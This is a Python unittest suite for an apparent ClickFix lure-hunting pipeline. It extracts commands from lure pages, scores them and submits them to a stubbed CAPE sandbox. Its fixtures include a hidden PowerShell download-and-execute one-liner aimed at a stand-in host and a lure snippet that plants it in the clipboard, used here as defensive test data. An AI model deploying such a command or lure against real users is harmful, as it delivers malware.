"""End-to-end pipeline tests against a stub CAPE apiv2 and a stub lure host.

Covers the submission contract (machine targeting, the tag trap), the
fully-automatic policy, provenance linkage, and dedupe -- all offline.
"""

import json
import os
import shutil
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import pipeline  # noqa: E402
from cape_client import CapeClient  # noqa: E402
from config import Config  # noqa: E402
from state import ClickfixStore  # noqa: E402
from urlscan_source import Candidate  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'

SUBMISSIONS = []
LURES = {}


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in LURES:
            body = LURES[self.path].encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if "/tasks/status/" in self.path:
            return self._json({"data": "reported"})
        if "/tasks/get/report/" in self.path:
            return self._json({"info": {"id": 42}, "malscore": 8.0})
        if "/tasks/get/iocs/" in self.path:
            return self._json({"detections": ["fakenet"]})
        if "/machines/list/" in self.path:
            return self._json({"data": [{"name": "cuckoo1"}]})
        self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        SUBMISSIONS.append(raw)
        self._json({"error": False, "data": {"task_ids": [42]}})

    def _json(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


class PipelineTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = HTTPServer(("127.0.0.1", 0), _Handler)
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = f"http://127.0.0.1:{cls.server.server_port}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        SUBMISSIONS.clear()
        LURES.clear()
        self.tmp = tempfile.mkdtemp(prefix="clickfix-test-")
        cfg = Config()
        cfg.cape.base_url = self.base
        cfg.pipeline.db_path = os.path.join(self.tmp, "t.db")
        cfg.pipeline.commands_dir = os.path.join(self.tmp, "commands")
        cfg.pipeline.reports_dir = os.path.join(self.tmp, "reports")
        cfg.pipeline.audit_log = os.path.join(self.tmp, "audit.log")
        cfg.urlscan.use_result_api = False   # no network to urlscan in tests
        os.makedirs(cfg.pipeline.commands_dir, exist_ok=True)
        os.makedirs(cfg.pipeline.reports_dir, exist_ok=True)
        self.cfg = cfg
        self.store = ClickfixStore(cfg.pipeline.db_path)

    def tearDown(self):
        self.store.close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _discover(self, path="/lure", html=None):
        LURES[path] = html if html is not None else f'<script>navigator.clipboard.writeText("{PS}");</script>'
        url = self.base + path
        uuid = f"uuid-{path.strip('/')}"
        row_id = self.store.insert_discovered("urlscan", uuid, url)
        pipeline._process_extraction(self.cfg, self.store, row_id, url, uuid)
        return row_id


class TestSubmissionContract(PipelineTestCase):
    def test_machine_label_is_sent(self):
        row_id = self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        self.assertTrue(SUBMISSIONS, "no submission was made")
        self.assertIn('name="machine"', SUBMISSIONS[0])
        self.assertIn("cuckoo1", SUBMISSIONS[0])

    def test_no_tags_sent_by_default(self):
        # Regression guard: CAPE requires every non-arch task tag to also be a
        # MACHINE tag. Sending tags=clickfix made every task unschedulable.
        self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        self.assertNotIn('name="tags"', SUBMISSIONS[0])

    def test_tags_sent_only_when_explicitly_configured(self):
        self.cfg.cape.tags = "x64"
        self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        self.assertIn('name="tags"', SUBMISSIONS[0])

    def test_package_and_route_are_sent(self):
        self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        self.assertIn("ps1", SUBMISSIONS[0])
        self.assertIn("internet", SUBMISSIONS[0])

    def test_custom_carries_urlscan_uuid(self):
        self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        self.assertIn("urlscan:uuid-lure", SUBMISSIONS[0])


class TestAutomationPolicy(PipelineTestCase):
    def test_strong_command_is_auto_approved_without_human(self):
        row_id = self._discover()
        self.assertEqual(self.store.get(row_id)["status"], "auto_approved")

    def test_weak_command_still_submits_when_review_off(self):
        # review_mode=off is the default: nothing may park on a human.
        row_id = self._discover("/weak", '<textarea>start-process calc.exe</textarea>')
        self.assertEqual(self.store.get(row_id)["status"], "auto_approved")

    def test_review_mode_on_parks_weak_command(self):
        self.cfg.sanitize.review_mode = "on"
        row_id = self._discover("/weak2", '<textarea>start-process calc.exe</textarea>')
        self.assertEqual(self.store.get(row_id)["status"], "pending_review")

    def test_below_floor_is_low_confidence_not_pending(self):
        # PS scores 6 (strong: -w hidden, iex( ; weak: powershell, irm), so the
        # floor has to sit above that to exercise the reject path.
        self.cfg.sanitize.min_submit_score = 99
        row_id = self._discover("/floor")
        row = self.store.get(row_id)
        self.assertEqual(row["status"], "low_confidence")
        self.assertEqual(row["failure_reason"], "below_min_submit_score")

    def test_low_confidence_is_not_submitted(self):
        self.cfg.sanitize.min_submit_score = 99
        self._discover("/floor2")
        pipeline.submit_ready(self.cfg, self.store)
        self.assertEqual(SUBMISSIONS, [])


class TestProvenanceAndLinkage(PipelineTestCase):
    def test_extraction_metadata_is_recorded(self):
        row_id = self._discover()
        row = self.store.get(row_id)
        self.assertEqual(row["extraction_method"], "clipboard_writetext")
        self.assertEqual(row["extraction_layer"], "live_final_url")
        self.assertIsNotNone(row["final_url"])
        self.assertGreaterEqual(row["candidates_found"], 1)
        self.assertIsNotNone(json.loads(row["layers_tried"]))

    def test_failure_reason_is_recorded_not_discarded(self):
        row_id = self._discover("/empty", "<html><h1>hello</h1></html>")
        row = self.store.get(row_id)
        self.assertEqual(row["status"], "no_command")
        self.assertEqual(row["failure_reason"], "no_command")

    def test_full_chain_to_linkage_json(self):
        row_id = self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        pipeline.collect_reports(self.cfg, self.store)

        row = self.store.get(row_id)
        self.assertEqual(row["status"], "reported")
        self.assertEqual(row["cape_task_id"], 42)
        self.assertEqual(row["cape_machine"], "cuckoo1")

        linkage_path = os.path.join(self.cfg.pipeline.reports_dir, "42", "linkage.json")
        self.assertTrue(os.path.exists(linkage_path))
        with open(linkage_path) as fh:
            link = json.load(fh)
        # urlscan UUID -> ClickFix URL -> command hash -> CAPE task ID
        self.assertEqual(link["urlscan_uuid"], "uuid-lure")
        self.assertTrue(link["original_url"].endswith("/lure"))
        self.assertEqual(link["cape_task_id"], 42)
        self.assertEqual(len(link["command_sha256"]), 64)
        self.assertEqual(link["extraction_method"], "clipboard_writetext")

    def test_report_and_iocs_are_saved(self):
        self._discover()
        pipeline.submit_ready(self.cfg, self.store)
        pipeline.collect_reports(self.cfg, self.store)
        d = os.path.join(self.cfg.pipeline.reports_dir, "42")
        self.assertTrue(os.path.exists(os.path.join(d, "report.json")))
        self.assertTrue(os.path.exists(os.path.join(d, "iocs.json")))

    def test_command_file_is_content_addressed(self):
        row_id = self._discover()
        sha = self.store.get(row_id)["command_sha256"]
        self.assertTrue(os.path.exists(os.path.join(self.cfg.pipeline.commands_dir, f"{sha}.ps1")))


class TestDeduplication(PipelineTestCase):
    def test_same_command_twice_is_skipped(self):
        self._discover("/a")
        pipeline.submit_ready(self.cfg, self.store)
        row_id2 = self._discover("/b")   # different URL, identical command
        self.assertEqual(self.store.get(row_id2)["status"], "duplicate_skipped")

    def test_duplicate_is_not_resubmitted(self):
        self._discover("/a")
        pipeline.submit_ready(self.cfg, self.store)
        self._discover("/b")
        pipeline.submit_ready(self.cfg, self.store)
        self.assertEqual(len(SUBMISSIONS), 1)

    def test_seen_uuid_is_not_reprocessed(self):
        self._discover("/a")
        self.assertTrue(self.store.has_seen("uuid-a"))


class TestCapeClientHelpers(PipelineTestCase):
    def test_list_machines(self):
        client = CapeClient(self.cfg.cape)
        self.assertEqual(client.list_machines(), ["cuckoo1"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
